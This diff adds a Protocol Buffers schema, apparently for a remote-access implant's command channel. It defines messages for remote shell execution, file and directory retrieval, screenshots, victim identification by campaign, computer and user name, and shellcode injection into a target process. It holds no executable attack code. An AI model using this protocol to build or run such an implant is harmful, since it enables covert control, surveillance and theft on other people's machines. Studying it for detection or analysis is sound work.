@@ -1,0 +1,73 @@
+syntax = "proto3";
+package migrat;
+
+option go_package = ".";
+
+message ShellCommand {
+    string command = 1;
+}
+
+message ShellResponse {
+    string output = 1;
+}
+
+message GetFile {
+    string path = 1;
+}
+
+message File {
+    string path = 1;
+    bytes data = 2;
+}
+
+message HeartbeatResponse {
+    bool keep_open = 1;
+}
+
+message Ident {
+    string id = 1;
+    string campainId = 2;
+    string computerName = 3;
+    string processname = 4;
+    string username = 5;
+}
+
+message TakeScreenshot {
+    int32 screen = 1;
+}
+
+message Screenshot {
+    string time = 1;
+    bytes data = 2;
+}
+
+message GetDirectory {
+    string path = 1;
+}
+
+message FileInfo {
+    string name = 1;
+    int64 size = 2;
+    bool directory = 3;
+    string owner = 4;
+}
+
+message GetDirectoryResponse {
+    string basepath = 1;
+    repeated FileInfo files = 2;
+}
+
+message Interpret {
+    int32 type = 1;
+    string data = 2;
+}
+
+message InterpretResponse {
+    int32 type = 1;
+    string data = 2;
+}
+
+message InjectShellcode {
+    string target = 1;
+    bytes shellcode = 2;
+}
